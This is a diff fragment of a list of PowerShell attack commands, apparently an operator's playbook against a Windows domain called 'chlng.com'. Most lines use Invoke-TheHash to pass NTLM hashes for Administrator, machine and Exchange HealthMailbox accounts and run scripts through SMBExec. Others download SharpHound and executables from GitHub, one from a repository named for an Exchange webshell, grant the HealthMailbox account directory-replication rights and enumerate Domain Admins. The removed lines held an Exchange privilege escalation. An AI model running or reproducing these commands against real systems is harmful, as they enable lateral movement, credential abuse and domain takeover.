@@ -33,12 +33,18 @@ powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-maste
 
 powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username CHLNG-WKS-1$ -Hash \'86fdb74721e95a00313dc72003155fc8\' -Action List -Source \'\\\\chlng.com\\SYSVOL\' -verbose
 
-powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'localhost\' -Username Administrator -Hash \'60ba4fcadc466c7a033c178194c03df6\' -Command \'cmd /c dir C:\\ ^> C:\\ProgramData\\output20.txt\ 2>&1' -verbose
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'localhost\' -Username Administrator -Hash \'60ba4fcadc466c7a033c178194c03df6\' -Command \'powershell -File C:\\ProgramData\\script.ps1\' -verbose
+
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'dc930d98b76baff8b765bff94feed342\' -Command \'C:\\ProgramData\\script.bat\' -verbose
 
 powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username CHLNG-WKS-1$ -Hash \'86fdb74721e95a00313dc72003155fc8\' -Command \'' -verbose
 
-powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/OreNPluS1/jscript_exchange_webshell/raw/main/TeamViewerQS_personal.exe\' -OutFile C:\\ProgramData\\TeamViewerQS_personal.exe 
+powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/1.5/Ingestors/SharpHound.exe\' -OutFile \'C:\\ProgramData\\SharpHound.exe\'
 
-powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-RoleGroupMember \'Organization Management\' -Member HealthMailbox88fa07b
+powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1\' -OutFile \'C:\\ProgramData\\SharpHound.ps1\'
 
-powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-RoleGroupMember \'Organization Management\'
+powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/OreNPluS1/jscript_exchange_webshell/main/SharpHound.exe\' -OutFile \'C:\\ProgramData\\SharpHound.exe\'
+
+powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-ADGroupMember -Identity \'Replicating Directory Changes\' -Members HealthMailbox88fa07b
+
+powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-ADGroupMember \'Domain Admins\'
